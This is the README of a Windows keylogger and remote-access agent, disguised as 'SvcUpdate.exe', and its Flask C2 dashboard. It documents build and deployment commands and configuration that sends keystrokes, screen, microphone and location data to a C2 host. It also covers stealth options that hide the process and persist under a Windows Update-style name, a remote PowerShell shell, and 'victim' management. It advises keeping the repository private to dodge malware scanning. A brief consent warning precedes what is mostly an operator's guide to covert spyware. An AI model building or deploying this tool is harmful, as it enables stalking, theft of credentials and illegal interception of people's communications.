# KeyloggerApp — Agent + C2 Dashboard

A Windows endpoint-monitoring agent (`SvcUpdate.exe`) that reports to a
self-hosted Flask dashboard, with live screen streaming, live microphone,
location tracking, remote terminal, file transfer and self-update.

Tested: Windows 10/11 (agent, Python 3.14) · Ubuntu 24.04 (dashboard) ·
desktop and mobile browsers for the dashboard UI.

---

## Table of contents

1. [Authorization warning](#authorization-warning)
2. [What it does](#what-it-does)
3. [Architecture](#architecture)
4. [Repository layout](#repository-layout)
5. [Requirements](#requirements)
6. [Quick start — agent](#quick-start--agent)
7. [Quick start — dashboard (Windows)](#quick-start--dashboard-windows)
8. [Production deployment (Linux)](#production-deployment-linux)
9. [Configuration reference](#configuration-reference)
10. [Building from source](#building-from-source)
11. [HTTP API](#http-api)
12. [Data storage](#data-storage)
13. [Bandwidth planning](#bandwidth-planning)
14. [Operations](#operations)
15. [Troubleshooting](#troubleshooting)
16. [Security notes](#security-notes)
17. [License](#license)

---

## Authorization warning

⚠️ This software records keystrokes, screenshots, screen video, microphone
audio and location. **Using it on a device you do not own, or without the
informed consent of the person using it, is illegal in most jurisdictions**
and is a crime in many (unauthorised access / interception of communications).

Acceptable use:

- ✅ devices you own and administer yourself
- ✅ parental monitoring of your own minor children
- ✅ employee monitoring on company hardware, with written notice and consent

Unacceptable use:

- ❌ someone else's personal device
- ❌ "security research" against systems you have no written permission to test
- ❌ hiding the agent from a user who has a legal right to know it exists

You are responsible for complying with the law where you and the monitored
devices are located.

---

## What it does

**Agent** — one self-contained Windows `.exe`:

| Capability         | Detail                                                |
| ------------------ | ----------------------------------------------------- |
| Keystrokes         | Global keyboard hook, buffered by window title        |
| Mouse + clipboard  | Click positions, clipboard text changes               |
| Screenshots        | Periodic stills                                       |
| Screen recording   | Optional short `.mp4` clips                         |
| Audio clips        | Periodic `.wav` recordings                          |
| Live screen stream | On-demand MJPEG to the dashboard                      |
| Live microphone    | On-demand streamed WAV, near real-time                |
| Location           | Windows Location API → Wi-Fi/BSSID → IP fallback    |
| Remote shell       | PowerShell command execution                          |
| File browser       | List / download / upload remote files                 |
| Persistence        | Self-install, logon auto-start, single-instance mutex |
| Self-update        | Pulls a new build from the dashboard and swaps itself |

**Dashboard** — Flask + SocketIO:

- Victim list with live online/offline presence
- Live screen view, fullscreen toggle, quality control
- Live microphone player with level meter, volume and mute
- Map with location history
- Full-text search across keystrokes and clipboard
- Remote terminal with history export
- File browser, batch download, file-transfer jobs
- Alert rules (keyword match, offline, low disk)
- User accounts and roles (`admin`, `viewer`)
- Agent build management and rollout

---

## Architecture

```
 ┌─────────────────────────┐        HTTPS (443, TLS)         ┌──────────────────────────┐
 │  Agent  (SvcUpdate.exe) │ ──────────────────────────────► │  Caddy (reverse proxy)   │
 │  Windows, onefile exe   │                                 │  auto Let's Encrypt      │
 │                         │ ◄────────────────────────────── │  flush_interval -1       │
 │  • key/mouse/clipboard  │        commands, updates        └───────────┬──────────────┘
 │  • screenshots, audio   │                                             │ 127.0.0.1:5000
 │  • stream, mic, GPS     │                                             ▼
 │  • local spool on disk  │                                 ┌──────────────────────────┐
 └─────────────────────────┘                                 │  Dashboard (Flask)       │
                                                             │  Flask-SocketIO          │
                                                             │  SQLite (WAL)            │
                                                             │  /var/lib/c2dashboard    │
                                                             └───────────┬──────────────┘
                                                                         │
                                                              ┌──────────▼──────────┐
                                                              │  Browser (operator) │
                                                              └─────────────────────┘
```

Control is **pull-based**: the agent polls `/api/victim/<id>/command` for
instructions and pushes data to the ingest endpoints. It also opens a control
socket for the live stream and microphone.

Auth: every ingest request carries `X-Ingest-Key`, which must match the
dashboard's `INGEST_KEY`. The dashboard UI is behind Flask-Login.

---

## Repository layout

```
key12.py                     agent source (builds SvcUpdate.exe)
SvcUpdate.spec               PyInstaller spec for the agent
requirements-agent.txt       agent dependencies (incl. winrt geolocation)
version_info.txt             Windows version resource
make_icon.py                 icon generator

dashboard/
  dashboardbackup.py         dashboard source (C2Dashboard.exe / Linux service)
  C2Dashboard.spec           PyInstaller spec for the dashboard
  requirements.txt           Windows dashboard dependencies
  templates/                 Jinja pages: agents, alerts, map, search, admin
  .env                       ⚠ secrets — never commit (see .gitignore)

deploy/oracle/
  README.md                  step-by-step Oracle Cloud migration guide
  install.sh                 one-shot installer (Ubuntu / Oracle Linux 9)
  Caddyfile                  TLS + streaming reverse proxy
  c2dashboard.service        systemd unit
  requirements-linux.txt     Linux-only deps (no pystray / winrt / eventlet)
  package.ps1                builds the deployment tarball

tools/
  pull_from_oracle.ps1       scheduled export: DB + new captures → local PC

tests/                       smoke + integration tests
dist/                        build output (gitignored)
```

---

## Requirements

**Agent build host**

- Windows 10/11 x64
- Python 3.13/3.14
- `pip install -r requirements-agent.txt`
- PyInstaller 6.x

> **The `winrt-*` packages must be installed for the interpreter that runs
> PyInstaller.** Build with `python -m PyInstaller`, **not**
> `venv\Scripts\pyinstaller.exe`. Building through the venv silently skips the
> WinRT tree and produces an exe with no native geolocation (~82 MB instead of
> ~89 MB, and location falls back to IP).

**Dashboard host (Linux)**

- Ubuntu 24.04 (or Oracle Linux 9 / RHEL 9)
- Python 3.12+, SQLite, Caddy
- 1 CPU / 1 GB RAM is enough (the installer adds 2 GB swap automatically)

**Dashboard host (Windows)** — optional, for local use only.

---

## Quick start — agent

```powershell
# 1. build (see "Building from source")
python -m PyInstaller --clean --noconfirm SvcUpdate.spec

# 2. deploy
Copy-Item dist\SvcUpdate.exe C:\ProgramData\WinSvc\SvcUpdate.exe -Force

# 3. optional config — without it the compiled-in defaults are used
Copy-Item deploy\config.ini C:\ProgramData\WinSvc\config.ini

# 4. run
Start-Process C:\ProgramData\WinSvc\SvcUpdate.exe
```

The agent self-installs to `C:\ProgramData\WinSvc\`, registers a logon
auto-start entry and takes a single-instance mutex.

**Point it at your dashboard** — in `config.ini`:

```ini
[Settings]
C2Server = https://c2.example.com
```

or via environment variable (wins over the file):

```powershell
$env:C2_SERVER = "https://c2.example.com"
```

Logs: `%APPDATA%\WindowsUpdateService\logs\service.log`

---

## Quick start — dashboard (Windows)

```powershell
cd dashboard
python -m pip install -r requirements.txt
# create .env with the keys below, then:
python dashboardbackup.py
```

Open [http://127.0.0.1:5000](http://127.0.0.1:5000). On first start an `admin` user is created from
`ADMIN_USER` / `ADMIN_PASS`.

---

## Production deployment (Linux)

Full walkthrough: **[`deploy/oracle/README.md`](deploy/oracle/README.md)**

Short version, from the package directory:

```bash
# on your build machine
cd deploy/oracle && ./package.ps1 -IncludeData      # or without -IncludeData

# copy to the VM
scp -i key c2dashboard-package.tar.gz ubuntu@<vm-ip>:~/c2pkg.tar.gz
ssh -i key ubuntu@<vm-ip> "mkdir -p c2pkg && tar xzf c2pkg.tar.gz -C c2pkg"
ssh -i key ubuntu@<vm-ip> "sudo bash c2pkg/install.sh c2.example.com"
```

`install.sh` installs Python + Caddy, creates an unprivileged `c2` user,
builds the virtualenv, generates `.env` with fresh secrets, installs the
systemd unit and Caddyfile, and opens 80/443 in the OS firewall.

Then, in the cloud console:

1. **Security list** — allow ingress TCP **80** and **443** from `0.0.0.0/0`
2. **DNS** — an `A` record for the hostname → the VM's public IP, **DNS only**
   (not proxied), or the certificate challenge will fail

Verify:

```bash
systemctl status c2dashboard caddy
curl -s localhost:5000/api/health
curl -s https://c2.example.com/api/health
```

---

## Configuration reference

`config.ini` sits next to the exe. Every key is optional; anything omitted
keeps the compiled-in default. Environment variables win over the file.

### `[Settings]`

| Key                    | Default                              | Meaning                          |
| ---------------------- | ------------------------------------ | -------------------------------- |
| `C2Server`           | `https://c2.c2dashboard.dpdns.org` | Dashboard base URL               |
| `ScreenshotInterval` | `180`                              | Seconds between screenshots      |
| `SyncInterval`       | `300`                              | Seconds between dashboard pushes |

### `[Stealth]`

| Key              | Default  | Meaning                                              |
| ---------------- | -------- | ---------------------------------------------------- |
| `HideProcess`  | `true` | Hide from task list / window list                    |
| `SelfInstall`  | `true` | Copy to `C:\ProgramData\WinSvc` and run from there |
| `RunOnStartup` | `true` | Register a logon auto-start entry                    |

### `[Advanced]`

| Key                          | Default   | Meaning                                        |
| ---------------------------- | --------- | ---------------------------------------------- |
| `ImageQuality`             | `70`    | JPEG quality for screenshots and stream frames |
| `ScreenRecordEnabled`      | `false` | Record screen video clips                      |
| `ScreenRecordInterval`     | `300`   | Seconds between clips                          |
| `ScreenRecordDuration`     | `20`    | Seconds per clip                               |
| `AudioEnabled`             | `true`  | Record periodic `.wav` clips                 |
| `AudioInterval`            | `300`   | Seconds between clips                          |
| `AudioDuration`            | `10`    | Seconds per clip                               |
| `AudioStreamEnabled`       | `true`  | Enable the live microphone feed                |
| `AudioStreamSampleRate`    | `16000` | Live mic sample rate (Hz)                      |
| `AudioStreamChannels`      | `1`     | Live mic channels (mono)                       |
| `AudioStreamChunkDuration` | `1`     | Seconds of audio per chunk                     |
| `LocationEnabled`          | `true`  | Enable location tracking                       |
| `LocationInterval`         | `60`    | Seconds between location updates               |
| `UploadBatchFiles`         | `3`     | Files per upload POST                          |
| `UploadBatchMB`            | `1`     | Max MB per upload POST                         |
| `UploadMaxFileMB`          | `40`    | Files larger than this are discarded           |
| `UploadInterval`           | `5`     | Seconds to wait after a failed upload          |

> **`SyncInterval` vs dashboard presence.** The dashboard marks a victim
> offline after `PRESENCE_STALE_SECONDS` (600 s) of silence. Keep
> `SyncInterval` comfortably below that, or a healthy agent will flap between
> online and offline.

### Dashboard `.env`

| Key                             | Meaning                                           |
| ------------------------------- | ------------------------------------------------- |
| `DASHBOARD_SECRET_KEY`        | Flask session secret (random 64 hex)              |
| `INGEST_KEY`                  | Shared secret the agents send as `X-Ingest-Key` |
| `DASHBOARD_PORT`              | Listen port (default 5000)                        |
| `DATA_DIR`                    | Where the DB and received files live              |
| `ADMIN_USER` / `ADMIN_PASS` | Bootstrap admin account                           |

> `INGEST_KEY` is deliberately **not** randomised by `install.sh`: every
> deployed agent has the key compiled in (`DASHBOARD_KEY` in `key12.py`). A
> fresh random key would make the whole fleet start returning `401`.

---

## Building from source

### Agent

```powershell
python -m PyInstaller --clean --noconfirm SvcUpdate.spec
# -> dist\SvcUpdate.exe  (~89 MB, onefile, windowed)
```

Confirm the frozen exe really contains the current source:

```powershell
python tests\_verify_exes.py
```

The entry script is a **CArchive entry named `key12`**, not a module inside the
PYZ — that is what the verifier looks for.

Bump `AGENT_VERSION` in `key12.py` for any behaviour change. The dashboard
compares it as a **strict string** against the uploaded build's version, so a
mismatch shows every agent as "stale".

### Dashboard (Windows)

```powershell
cd dashboard
python -m PyInstaller --clean --noconfirm C2Dashboard.spec
# -> dashboard\dist\C2Dashboard.exe  (~29 MB)
```

If the previous exe is locked by a running instance, build elsewhere:

```powershell
python -m PyInstaller --clean --noconfirm --distpath dist2 C2Dashboard.spec
```

---

## HTTP API

### Agent → dashboard (auth: `X-Ingest-Key`)

| Method | Path                          | Purpose                                   |
| ------ | ----------------------------- | ----------------------------------------- |
| POST   | `/api/ingest`               | Keystrokes, mouse, clipboard, system info |
| POST   | `/api/ingest_frame`         | Live stream JPEG frame                    |
| POST   | `/api/ingest_audio_stream`  | Live microphone WAV chunk                 |
| POST   | `/api/ingest_gps`           | Location fix                              |
| GET    | `/api/command`              | Poll for the next command                 |
| GET    | `/api/batch/<vid>/next`     | Next file-transfer job                    |
| POST   | `/api/batch/<vid>/progress` | Report transfer progress                  |
| GET    | `/api/cache_path`           | Server-side cache path for a file         |
| GET    | `/api/agent/download`       | Download the current agent build          |
| GET    | `/api/agent/info`           | Current build metadata                    |

### Dashboard → browser (session auth)

| Path                                       | Purpose                         |
| ------------------------------------------ | ------------------------------- |
| `/login`, `/logout`                    | Authentication                  |
| `/`, `/agents`                         | Victim list                     |
| `/stream/<vid>`                          | Live screen (MJPEG)             |
| `/audio_stream/<vid>`                    | Live microphone (streaming WAV) |
| `/map`, `/api/map_data`                | Location map                    |
| `/search`, `/api/search`               | Keystroke / clipboard search    |
| `/alerts`, `/api/alerts`               | Alert rules                     |
| `/admin`, `/api/users`                 | User management                 |
| `/api/term/<vid>/history`                | Remote terminal                 |
| `/api/browse`, `/file/<fid>`           | File browser                    |
| `/api/victim/<vid>/command`              | Queue a command                 |
| `/api/agent/push`, `/api/agent/upload` | Roll out a new build            |
| `/api/health`                            | Unauthenticated liveness probe  |

---

## Data storage

**Agent** — `%APPDATA%\WindowsUpdateService\logs\`

```
service.log            agent log
data.db                local upload queue (SQLite)
shot_*.png             queued screenshots
audio_*.wav            queued audio clips
vid_*.mp4              queued screen recordings
```

**Dashboard** — `DATA_DIR` (Linux default `/var/lib/c2dashboard`)

```
dashboard.db           SQLite database (WAL mode)
dashboard.log          application log
received_files/        uploaded captures, per victim
received_files/agent_update.exe    current agent build slot
received_files/agent_update.json   its {"version": ...} metadata
```

Back up a **running** dashboard with SQLite's backup API, not with `cp` —
copying a WAL database live can produce a file that fails `integrity_check`:

```bash
sudo sqlite3 /var/lib/c2dashboard/dashboard.db ".backup /tmp/backup.db"
```

---

## Bandwidth planning

Read this before raising capture intervals — it is the most common cause of
"the dashboard is stuck on loading".

Per-agent cost with the shipped defaults:

| Capture                                              | Cost                              |
| ---------------------------------------------------- | --------------------------------- |
| Screenshots every 180 s (~160 KB)                    | ~3 MB/hr                          |
| Audio 10 s every 300 s                               | ~11 MB/hr                         |
| Screen recording (default off; 20 s/300 s ≈ 2.7 MB) | ~32 MB/hr                         |
| **Default total**                              | **~14 MB/hr ≈ 330 MB/day** |
| Live microphone while *listening*, 16 kHz mono     | ~32 KB/s                          |
| Live microphone while *listening*, 44.1 kHz mono   | ~88 KB/s                          |

An aggressive configuration (audio 15 s/30 s, video 30 s/60 s, 44.1 kHz mic)
costs roughly **320 MB/hr = 7.7 GB/day** — more than most home uplinks can
sustain. The symptom is not an obvious error: the local spool grows without
bound, uploads fall permanently behind, the live stream starves, and the
dashboard appears to hang while the real cause is a saturated upstream.

Rules of thumb:

- Keep `ScreenRecordEnabled = false` unless the link is genuinely fast.
- Prefer the **live stream** for watching activity in real time — it uploads
  only while an operator is looking and never accumulates on disk.
- Keep `AudioStreamSampleRate` at `16000` for speech (≈1/3 the bytes).
- Check the spool size if uploads feel slow:

```powershell
Get-ChildItem "$env:APPDATA\WindowsUpdateService\logs" -File |
  Measure-Object Length -Sum | Select-Object Count, @{n='MB';e={[math]::Round($_.Sum/1MB,1)}}
```

---

## Operations

### Services

```bash
systemctl status c2dashboard caddy
journalctl -u c2dashboard -f
journalctl -u caddy -f
sudo tail -f /var/log/caddy/c2dashboard.log
```

Both are `enabled`, so they survive a reboot. `Restart=always` brings the
dashboard back after a crash.

### Rolling out a new agent build

1. Build `SvcUpdate.exe`, bump `AGENT_VERSION`
2. Dashboard → **Agents / Updates** → upload the new exe with its version
   - or place it directly as `received_files/agent_update.exe` plus
     `agent_update.json` = `{"version": "x.y", "uploaded_by": "..."}`
3. Select victims → **Push update**
4. Agents download it on their next command poll and swap themselves via a
   generated `_svcupdate.bat`

The queued `UPDATE_AGENT` command carries **no build reference** — the agent
downloads whatever is in the slot at that moment.

### Scheduled export to a local machine

`tools/pull_from_oracle.ps1` pulls a consistent DB copy plus only the files
captured since the last successful run:

```powershell
schtasks /Create /SC DAILY /ST 22:00 /TN "C2 Pull" `
  /TR "powershell -NoProfile -ExecutionPolicy Bypass -File F:\path\tools\pull_from_oracle.ps1"
```

Tracks its cut-off in `exports\.last_pull` and keeps the last 14 exports.

### Stopping the agent temporarily

```powershell
Stop-Process -Name SvcUpdate -Force
# more durable: disable the logon entry
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name WindowsUpdateService
```

---

## Troubleshooting

| Symptom                                             | Cause / fix                                                                                                                                                                                      |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Dashboard unreachable on 80/443                     | Cloud **security list** ingress rules missing — that is only half the firewall; the other half is the OS `iptables`, where the ACCEPT must sit **above** the catch-all `REJECT` |
| Caddy won't start, `permission denied` on its log | `/var/log/caddy` must be owned by the **`caddy`** user, not the app user                                                                                                               |
| `Timeout during connect` from Let's Encrypt       | DNS still proxied (orange cloud), or port 80 not reachable from the internet                                                                                                                     |
| Every agent returns `401`                         | `INGEST_KEY` in `.env` doesn't match the compiled-in `DASHBOARD_KEY`                                                                                                                       |
| Every agent shows "stale"                           | `agent_update.json` unparseable — a UTF-8 **BOM** breaks `json.load`; the reader uses `utf-8-sig` and logs the error                                                                |
| Victims flip online/offline                         | `SyncInterval` too close to the dashboard's 600 s stale threshold                                                                                                                              |
| Live view spins forever                             | Upstream bandwidth saturated — see [Bandwidth planning](#bandwidth-planning)                                                                                                                     |
| Live view spins, bandwidth fine                     | Reverse proxy buffering the MJPEG; Caddy needs `flush_interval -1`                                                                                                                             |
| Microphone silent                                   | `AudioStreamEnabled = false`, or the feed stopped after 0 chunks (the scheduler must set the active flag)                                                                                      |
| Location falls back to IP                           | No Location permission and no Wi-Fi BSSIDs — Windows suppresses `BSSID` lines without location access; the agent requests access and retries                                                  |
| Agent built without geolocation                     | Built with the venv's PyInstaller instead of the system one, so `winrt` was not bundled                                                                                                        |

---

## Security notes

**Never commit** (`.gitignore` covers these — verify before your first push):

- `dashboard/.env` — session secret, ingest key, admin password
- `keys/` — SSH private keys
- `config.ini` — may contain your dashboard URL
- `*.db` — captured keystrokes and user data
- `received_files/`, `exports/`, `backlog-archive/` — captured media

```powershell
git status --ignored --short | Select-String "env|key|\.db"
```

**Operational hardening**

- Terminate TLS at a reverse proxy; never expose `127.0.0.1:5000` directly
- Run the dashboard as an unprivileged service user (systemd `User=c2`)
- Rotate `INGEST_KEY` and rebuild agents if a build leaks
- The dashboard holds plaintext keystrokes and captured media — treat
  `DATA_DIR` and its backups as sensitive data
- Keep the agent's `DASHBOARD_KEY` and the server's `INGEST_KEY` in sync

> A repository containing a covert monitoring agent will likely be flagged by
> GitHub's malware / acceptable-use scanning if it is public. Keep it
> **private** unless you have a specific reason not to.

---

## License

See [LICENSE](LICENSE).
